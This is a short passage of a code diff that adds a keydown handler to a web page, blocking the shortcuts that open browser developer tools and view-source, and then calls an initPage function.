+                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) ||
+                (e.ctrlKey && e.key === 'U')
+            ) {
+                e.preventDefault();
+                return false;
+            }
+        });
+        
+        // Initialize the page
+        initPage();
     </script>
 </body>
 </html>
